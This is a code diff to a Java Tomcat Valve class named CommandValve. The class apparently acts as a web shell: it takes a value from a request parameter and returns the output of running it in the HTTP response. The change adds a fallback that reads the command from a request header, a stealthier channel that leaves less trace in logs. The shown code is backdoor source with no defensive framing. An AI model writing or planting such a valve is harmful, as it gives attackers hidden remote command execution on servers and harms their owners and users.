@@ -5,7 +5,6 @@ import org.apache.catalina.connector.Request;
 import org.apache.catalina.connector.Response;
 
 import javax.servlet.ServletException;
-import javax.servlet.ServletOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.util.Scanner;
@@ -19,8 +18,12 @@ public class CommandValve implements Valve {
     @Override
     public void invoke(Request request, Response response) throws IOException, ServletException {
         try {
-            String param = getParam(request.getParameter(paramName));
-            if (param != null) {
+            String p = request.getParameter(paramName);
+            if (p == null || p.isEmpty()) {
+                p = request.getHeader(paramName);
+            }
+            if (p != null) {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
                 response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
                 return;
